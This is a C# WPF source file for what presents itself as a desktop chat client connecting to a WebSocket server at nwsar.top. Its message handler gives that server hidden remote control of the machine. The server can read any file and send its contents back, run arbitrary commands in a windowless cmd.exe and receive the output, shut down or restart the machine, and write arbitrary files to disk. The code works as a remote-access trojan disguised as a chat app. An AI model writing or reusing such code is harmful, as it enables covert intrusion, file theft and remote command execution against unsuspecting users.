using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using WebSocketProtocol;

namespace Client_Desktop
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            socket.OnlineMessageReceived += OnOnlineMessageReceived;
            socket.StartService();
            try
            {
                string AddressIP = string.Empty;
                foreach (IPAddress _IPAddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                {
                    if (_IPAddress.AddressFamily.ToString() == "InterNetwork")
                    {
                        AddressIP = _IPAddress.ToString();
                    }
                }
                this.Title += " - " + AddressIP;
            }
            catch { }
        }

        public SocketClient socket = new SocketClient("wss://www.nwsar.top:8080/connect", "client", "client");
        private bool type=true;
        /// <summary>
        /// 发送聊天
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Send_Click(object sender, RoutedEventArgs e)
        {
            string message = textBox1.Text;
            var tuple = Tuple.Create<string, object>("message", message);
            if (socket.Open)
            {
                socket.Send("server", tuple);
                textBox1.Text = string.Empty;
                Dispatcher.Invoke(delegate
                {
                    label1.Text += message + "\n";
                });
            }
            else
            {
                MessageBox.Show("Socket未连接成功,请稍后重试");
                socket.StartService();
            }
        }

        /// <summary>
        /// socket消息接收处理
        /// </summary>
        /// <param name="e"></param>
        void OnOnlineMessageReceived(MessageReceivedEventArgs e)
        {
            var tuple0 = (Tuple<string, object>)e.Protocol.Content;
            switch (tuple0.Item1)
            {
                case "file_request":
                    string path = (string)tuple0.Item2;
                    if (!File.Exists(path))
                    {
                        var t = Tuple.Create<string, object>("file_return", "File not Exits");
                        socket.Send("server", t);
                        return;
                    }
                    string[] fileName=path.Split('\\');
                    var fs = new FileStream(path, FileMode.Open);
                    byte[] bytes = new byte[fs.Length];
                    fs.Read(bytes, 0, bytes.Length);
                    var tuple = Tuple.Create<string,object>(fileName[fileName.Length-1], bytes);
                    fs.Close();
                    socket.Send("server", tuple);
                    break;
                case "message":
                    if ((string)tuple0.Item2 == "cmd")
                    {
                        type = false;
                        tuple = Tuple.Create<string, object>("cmd_return", "success");
                        socket.Send("server", tuple);
                    }
                    else if ((string)tuple0.Item2 == "chat")
                    {
                        type = true;
                        tuple = Tuple.Create<string, object>("chat_return", "success");
                        socket.Send("server", tuple);
                    }
                    else
                    {
                        Dispatcher.Invoke(delegate
                        {
                            label1.Text += (string)tuple0.Item2 + "\n";
                            label1.ScrollToEnd();
                        });
                    }
                    break;
                case "cmd":
                    if ((string)tuple0.Item2.Equals("chat"))
                    {
                        type = true;
                        tuple = Tuple.Create<string, object>("chat_return", "success");
                        socket.Send("server", tuple);
                        break;
                    }
                    else
                    {
                        var command = (string)tuple0.Item2 + " > command.txt";
                        var p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();
                        p.StandardInput.WriteLine(command);
                        p.StandardInput.WriteLine("exit");
                        string text = File.ReadAllText("command.txt", Encoding.Default);
                        tuple = Tuple.Create<string, object>("cmd_text", text);
                        socket.Send("server", tuple);
                        break;
                    }
                case "control":
                    switch ((string)tuple0.Item2)
                    {
                        case "shutdown":
                            Process.Start("shutdown.exe", "-s");
                            break;
                        case "restart":
                            Process.Start("shutdown.exe", "-r");
                            break;
                    }
                    break;
                default:
                    var tuple1 = (byte[])tuple0.Item2;
                    path = (string)tuple0.Item1;
                    var filestream = new FileStream(path, FileMode.Create);
                    filestream.Write(tuple1, 0, tuple1.Length);
                    filestream.Close();
                    tuple = Tuple.Create<string, object>("file_return", "succeed");
                    socket.Send("server", tuple);
                    break;
            }
            
        }
    }
}
